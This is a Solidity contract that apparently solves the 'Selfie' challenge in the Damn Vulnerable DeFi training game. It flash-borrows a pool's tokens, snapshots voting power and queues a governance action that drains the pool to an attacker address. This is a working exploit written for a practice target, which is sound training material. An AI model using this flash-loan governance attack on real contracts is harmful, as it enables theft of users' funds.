pragma solidity ^0.8.4;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieExploiter {
    SelfiePool pool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot dtToken;
    address dest;
    uint256 actionId;

    function exploit(address _pool, address _dest) external returns(uint256) {
        pool = SelfiePool(_pool);
        dtToken = DamnValuableTokenSnapshot(address(pool.token()));
        uint256 amount = dtToken.balanceOf(address(pool));
        governance = pool.governance();
        dest = _dest;

        dtToken.approve(address(pool), amount);

        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(dtToken), amount, "");
        return actionId + 1;
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        dtToken.snapshot();
        actionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", dest));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}